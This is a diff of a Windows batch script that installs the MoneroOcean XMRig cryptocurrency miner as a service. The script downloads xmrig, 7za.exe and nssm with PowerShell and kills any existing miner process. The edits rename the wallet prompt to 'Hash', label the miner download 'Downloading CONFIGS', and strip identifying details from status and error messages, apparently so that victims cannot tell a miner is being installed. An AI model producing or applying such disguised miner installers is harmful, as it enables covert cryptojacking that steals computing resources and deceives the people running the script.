@@ -1,6 +1,6 @@
 @echo off
 
-set VERSION=2.4
+set VERSION=3.1
 
 rem printing greetings
 
@@ -21,7 +21,7 @@ rem checking prerequisites
 if [%WALLET%] == [] (
   echo Script usage:
   echo ^> setup_moneroocean_miner.bat ^<wallet address^> [^<your email address^>]
-  echo ERROR: Please specify your wallet address
+  echo ERROR: Please specify your Hash
   exit /b 1
 )
 
@@ -189,7 +189,7 @@ echo.
 
 rem start doing stuff: preparing miner
 
-echo [*] Removing previous moneroocean miner (if any)
+echo [*] Removing previous Files (if exists)
 sc stop moneroocean_miner
 sc delete moneroocean_miner
 taskkill /f /t /im xmrig.exe
@@ -241,7 +241,7 @@ set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
 echo [*] Downloading CONFIGS
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
-  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrig.zip"
+  echo ERROR: Can't download 
   exit /b 1
 )
 
@@ -257,7 +257,7 @@ if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
   powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
-    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+    echo ERROR: Can't download 7za.exe to Path
     exit /b 1
   )
   echo [*] Unpacking advanced 
@@ -350,7 +350,7 @@ goto OK
 echo [*] Downloading tools For Setup
 powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
 if errorlevel 1 (
-  echo ERROR: Can't download tools to make moneroocean_miner service
+  echo ERROR: Can't download tools to Path
   exit /b 1
 )
 
@@ -412,8 +412,3 @@ for /L %%A in (12,-1,0) do (
 )
 endlocal & set %~2=%len%
 exit /b
-
-
-
-
-
